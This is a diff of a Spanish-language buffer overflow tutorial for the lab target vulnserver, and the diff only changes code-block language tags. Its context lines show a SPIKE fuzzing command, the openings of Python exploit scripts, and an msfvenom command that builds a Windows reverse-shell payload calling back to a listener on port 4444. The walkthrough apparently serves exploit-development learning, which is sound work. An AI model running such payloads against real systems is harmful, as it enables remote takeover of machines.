@@ -40,7 +40,7 @@ El script en spike que el escribio es el siguiente
 
 Y lo que va a hacer esto es enviar peticiones a cada una de las  funciones del vuln server. (por defecto esta escuchando en el puerto 9999 el VULN server)
 
-```
+```bash
 s_readline();
 s_string("TRUN ");
 s_string_variable("0");
@@ -49,7 +49,7 @@ s_string_variable("0");
 
 Ya en mi maquina pues comenzamos con el spike.
 
-```
+```bash
 ./generic_send_tcp 192.168.0.100 9999 something.spk 0 0
 
 ```
@@ -68,7 +68,7 @@ En el video lo hace con el depurador abierto cosa que yo no puedo nunca cae en e
 
 ![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/59519020-873f-4e79-8e15-dc15c1e002ad)
 
-```
+```python
 #!/usr/bin/python3
 
 import sys, socket
@@ -107,7 +107,7 @@ Vamos a ver exactamente que ofset sobre escribe el EIP.
 ![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/bd4e4ba8-7df6-461c-aab6-606b4497b6f1)
 
 
-```
+```python
 import sys, socket
 
 from time import sleep
@@ -137,7 +137,7 @@ Vamos a verificar qu si se pudiera escribir una B osea 42 en el EIP
 ![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/8e144d49-fb5c-40bf-92e9-b978ec1c8529)
 
 
-```
+```python
 #!/usr/bin/python3
 
 import sys, socket
@@ -177,7 +177,7 @@ Por defecto el 00 o null es un bad char porque en windows con eso acaban las cad
 
 Metemeos esos badchars con el script
 
-```
+```python
 #!/usr/bin/python3
 
 import sys, socket
@@ -262,7 +262,7 @@ Vamos a usar esa direccion para que apunte a JMP ESP y esa a nuestra shellcode.
 
 Vamos a usar el msfvenom
 
-```
+```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.230.128 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
 -f formato en c
 -a arquitectura x86
@@ -271,7 +271,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.230.128 LPORT=4444 EXITFUNC=
 
 Y pon la shell code que se genero en el script
 
-```
+```python
 
 #!/usr/bin/python3
 
